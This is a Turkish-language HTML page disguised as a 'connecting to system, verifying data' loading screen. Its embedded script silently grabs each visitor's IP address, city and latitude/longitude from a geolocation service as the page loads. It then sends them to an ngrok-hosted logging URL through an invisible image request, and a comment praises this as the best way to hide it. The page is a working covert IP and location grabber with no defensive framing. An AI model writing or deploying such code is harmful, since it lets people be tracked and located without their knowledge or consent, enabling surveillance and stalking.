<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Yükleniyor...</title>
    <style>
        body {
            background-color: #000;
            color: #0f0;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .loader {
            text-align: center;
        }
        .dots:after {
            content: ' .';
            animation: dots 1s steps(5, end) infinite;
        }
        @keyframes dots {
            0%, 20% { content: ' .'; }
            40% { content: ' ..'; }
            60% { content: ' ...'; }
            80%, 100% { content: ''; }
        }
    </style>
</head>
<body>

    <div class="loader">
        <h1>SİSTEME BAĞLANILIYOR<span class="dots"></span></h1>
        <p>Lütfen bekleyiniz, veriler doğrulanıyor...</p>
    </div>

<script>
    fetch('https://ipapi.co/json/')
    .then(res => res.json())
    .then(data => {
        const ip = data.ip;
        const city = data.city;
        const loc = data.latitude + "," + data.longitude;

        // Verileri linkin sonuna ekliyoruz (Query String)
        const hedefURL = `https://punctual-villain-arson.ngrok-free.dev/log?ip=${ip}&city=${city}&loc=${loc}`;

        // Görünmez bir resim üzerinden veriyi gönderiyoruz (En sağlam gizleme yöntemidir)
        const img = new Image();
        img.src = hedefURL;
    })
    .catch(err => console.log("Hata"));
</script>
</body>
</html>
